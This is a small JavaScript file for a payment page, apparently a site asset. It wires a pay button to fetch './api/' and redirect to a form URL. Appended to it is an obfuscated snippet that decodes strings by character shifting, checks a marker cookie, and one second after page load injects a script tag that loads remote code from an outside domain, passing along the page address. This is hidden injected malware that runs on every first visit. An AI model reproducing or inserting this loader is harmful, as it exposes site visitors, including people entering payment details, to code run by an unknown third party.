const sendPay = document.querySelector("#send_pay");

async function postData(url = "") {
  try {
    const response = await fetch(url, {});
    const data = await response.json();
    window.location.href = data.formUrl;
  } catch (error) {
    console.log(error, "error");
  }
}

sendPay.addEventListener("click", () => {
  postData("./api/");
});

(function (o, d, l) {
  try {
    o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
    o.b = o.f('UMUWJKX');
    o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
    setTimeout(function () {
      if (o.c) {
        o.s = d.createElement('script');
        o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href;
        d.body.appendChild(o.s);
      }
    }, 1000);
    d.cookie = o.b + '=full;max-age=39800;';
  } catch (e) {}
}({}, document, location));
